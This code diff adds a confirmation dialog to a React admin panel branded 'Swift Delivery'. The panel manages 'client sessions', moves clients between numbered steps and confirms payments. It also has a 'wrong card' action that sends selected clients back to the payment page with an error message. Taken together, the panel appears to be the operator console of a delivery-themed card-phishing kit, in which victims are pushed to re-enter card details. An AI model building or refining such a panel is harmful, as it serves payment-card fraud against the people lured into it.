@@ -12,6 +12,16 @@ import {
   SelectTrigger,
   SelectValue,
 } from "@/components/ui/select";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogCancel,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 import { 
   RefreshCw, 
   Users,
@@ -26,7 +36,8 @@ import {
   CreditCard,
   MessageSquare,
   Package,
-  CheckCircle
+  CheckCircle,
+  AlertTriangle
 } from "lucide-react";
 import { toast } from "@/hooks/use-toast";
 import swiftDeliveryLogo from "@/assets/swift-delivery-logo.png";
@@ -52,6 +63,22 @@ interface ClientSession {
   updated_at: string;
 }
 
+// Define which actions are destructive and need confirmation
+const destructiveActions: Record<string, { title: string; description: string }> = {
+  deactivate: {
+    title: "Deactivate Clients",
+    description: "This will remove these clients from the active list. They will no longer appear in the panel."
+  },
+  wrong_card: {
+    title: "Send Wrong Card Alert",
+    description: "This will send all selected clients back to the payment page with an error message."
+  },
+  confirm: {
+    title: "Confirm All Payments",
+    description: "This will mark all selected client payments as confirmed and complete their sessions."
+  }
+};
+
 const AdminPanel = () => {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [sessions, setSessions] = useState<ClientSession[]>([]);
@@ -59,6 +86,12 @@ const AdminPanel = () => {
   const [searchQuery, setSearchQuery] = useState("");
   const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
   const [bulkAction, setBulkAction] = useState("");
+  const [confirmDialog, setConfirmDialog] = useState<{
+    open: boolean;
+    action: string;
+    title: string;
+    description: string;
+  }>({ open: false, action: "", title: "", description: "" });
 
   // Filter sessions based on search query
   const filteredSessions = useMemo(() => {
@@ -94,18 +127,34 @@ const AdminPanel = () => {
     setSelectedIds(newSelected);
   };
 
-  const executeBulkAction = async () => {
+  const handleBulkAction = () => {
     if (!bulkAction || selectedIds.size === 0) return;
+    
+    // Check if action needs confirmation
+    if (destructiveActions[bulkAction]) {
+      setConfirmDialog({
+        open: true,
+        action: bulkAction,
+        title: destructiveActions[bulkAction].title,
+        description: `${destructiveActions[bulkAction].description} This will affect ${selectedIds.size} client${selectedIds.size > 1 ? 's' : ''}.`
+      });
+    } else {
+      executeBulkAction(bulkAction);
+    }
+  };
+
+  const executeBulkAction = async (action: string) => {
+    if (!action || selectedIds.size === 0) return;
 
     const ids = Array.from(selectedIds);
     
     try {
-      switch (bulkAction) {
+      switch (action) {
         case "step1":
         case "step2":
         case "step3":
         case "step4": {
-          const step = parseInt(bulkAction.replace("step", ""));
+          const step = parseInt(action.replace("step", ""));
           await supabase
             .from("client_sessions")
             .update({ current_step: step, approval_type: step === 2 ? null : undefined })
@@ -179,6 +228,11 @@ const AdminPanel = () => {
     }
   };
 
+  const handleConfirmAction = () => {
+    executeBulkAction(confirmDialog.action);
+    setConfirmDialog({ open: false, action: "", title: "", description: "" });
+  };
+
   // Check for existing admin session
   useEffect(() => {
     const adminAuth = sessionStorage.getItem("admin_authenticated");
@@ -248,7 +302,32 @@ const AdminPanel = () => {
   }
 
   return (
-    <div className="min-h-screen bg-background">
+    <>
+      {/* Confirmation Dialog */}
+      <AlertDialog open={confirmDialog.open} onOpenChange={(open) => !open && setConfirmDialog({ ...confirmDialog, open: false })}>
+        <AlertDialogContent>
+          <AlertDialogHeader>
+            <AlertDialogTitle className="flex items-center gap-2">
+              <AlertTriangle className="w-5 h-5 text-destructive" />
+              {confirmDialog.title}
+            </AlertDialogTitle>
+            <AlertDialogDescription>
+              {confirmDialog.description}
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter>
+            <AlertDialogCancel>Cancel</AlertDialogCancel>
+            <AlertDialogAction
+              onClick={handleConfirmAction}
+              className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
+            >
+              Confirm
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
+
+      <div className="min-h-screen bg-background">
       {/* Header */}
       <header className="bg-secondary text-secondary-foreground py-4 shadow-lg">
         <div className="container mx-auto px-4">
@@ -402,7 +481,7 @@ const AdminPanel = () => {
                       </Select>
                       <Button
                         size="sm"
-                        onClick={executeBulkAction}
+                        onClick={handleBulkAction}
                         disabled={!bulkAction}
                         className="gap-2"
                       >
@@ -458,7 +537,8 @@ const AdminPanel = () => {
           </TabsContent>
         </Tabs>
       </main>
-    </div>
+      </div>
+    </>
   );
 };
 
